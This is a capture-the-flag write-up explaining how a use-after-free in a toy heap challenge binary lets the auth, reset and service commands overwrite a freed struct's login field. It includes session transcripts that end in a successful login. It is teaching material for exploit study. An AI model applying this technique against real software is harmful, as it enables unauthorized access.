---
author: Esteban Aranda
---

##Heap 2 Writeup
Basic concepts that one should understand before attempting to solve this binary are: pointers, `malloc`, and `free`.

By examining the source code we can see that this problem has an auth structure made up of a 32 byte-long string and an int. Two pointers are defined, one to an auth struct and one to a "service" character. The program runs on an infinite while loop and there are four commands we can run, `auth`, `reset`, `service`, and `login`. Based on what command we run the program proceeds to do different actions. Our goal is to successfully log in to read the flag. To help us out, there is also a print statement that prints the memory addresses of our two variables.

Unlike previous heap problems, this problem reads user input from stdin using `fgets()`, so we cannot overflow it, and the `auth` commands also checks for length of the string. However, our plan is still to somehow overwrite `auth->auth` with `1`, to be able to login and read the flag.

We can first call the commands to see what they do:
`
[ auth = (nil), service = (nil) ]                                                                                          
auth AAAA                                                                                                                  
[ auth = 0x804b818, service = (nil) ]                                                                                      
service BBBB
[ auth = 0x804b818, service = 0x804b828 ]                                                                                  
login                                                                                                                      
please enter your password                                                                                                 
[ auth = 0x804b818, service = 0x804b828 ]                                                                                  
reset
[ auth = 0x804b818, service = 0x804b828 ]
`
Commands:
'auth': allocates memory for the auth struct and fills it with `0`'s via `memset`. It then checks if the string given after calling the command is shorter than 32 bytes, and if so it copies it into `auth->name`.
`reset`: frees the memory location pointed to by the auth struct pointer. However, as can be seen above, the pointer still points to the same location in memory even after calling the command. This is a Use-After-Free vulnerability that we can exploit since the `login` command will still try to access the “freed” `auth->auth`.
`service`: sets the service pointer to the memory address returned by `strdup`. This memory address contains the duplicate of the string input by the user. 
`login`: checks if `auth->auth` is equal to `1`, and if it is, it logins and prints out the flag. Otherwise, it prompts the user to enter the correct password.

We can read `strdup`'s manpage to see exactly how it works:
`
The strdup() function returns a pointer to a new string which is a duplicate of the
string  s.   Memory for the new string is obtained with malloc(3), and can be freed
with free(3).
`
The function allocates memory in the heap via `malloc`, so in theory after freeing the auth struct with the `reset` command, `strdup` will allocate memory in the same location pointed to by the auth pointer. We can confirm this by running the commands in the following order:
`
[ auth = (nil), service = (nil) ]                                                                                          
auth AAAA                                                                                                                  
[ auth = 0x804b818, service = (nil) ]                                                                                      
reset                                                                                                                      
[ auth = 0x804b818, service = (nil) ]                                                                                      
service BBBB
[ auth = 0x804b818, service = 0x804b818 ]                                                                                  
`
By first allocating memory for the struct, then freeing it, and then allocating memory for service via `strdup` we can see that both pointers end up pointing to `0x804b818`.

With the knowledge of what each command does, how `strdup` works, and the Use-After-Free vulnerability we are ready to exploit the program to login and get the flag. By calling the same sequence of command as above, but calling `service` with multiple `1`’s so that `strdup` will duplicate them onto the memory location pointed to by `auth->auth`, we can successfuly overwrite that field of the struct and login.
`
[ auth = (nil), service = (nil) ]                                                                                          
auth AAAA                                                                                                                  
[ auth = 0x804b818, service = (nil) ]                                                                                      
reset                                                                                                                      
[ auth = 0x804b818, service = (nil) ]                                                                                      
service 11111111111111111111111111111                                                                                      
[ auth = 0x804b818, service = 0x804b828 ]                                                                                  
login                                                                                                                      
you have logged in already!                                                                                                
flag: hello world!
                                                                            
[ auth = 0x804b818, service = 0x804b828 ]
`
